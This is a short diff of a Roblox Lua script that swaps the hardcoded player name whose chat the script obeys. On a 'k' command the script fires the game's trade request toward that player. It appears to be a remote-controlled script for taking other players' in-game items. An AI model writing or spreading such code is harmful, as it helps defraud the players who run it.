@@ -71,7 +71,7 @@ function MainCommands(plr, msg)
     
     if msg == "k" then
     local args = {
-    [1] = game:GetService("Players"):WaitForChild("aswdqe15256")
+    [1] = game:GetService("Players"):WaitForChild("JoeGG200")
 }
 
 game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
@@ -113,7 +113,7 @@ end
 end
 end
     
-    game.Players.aswdqe15256.Chatted:Connect(function(msg)
+    game.Players.JoeGG200.Chatted:Connect(function(msg)
     
     local args = {
         [1] = msg,
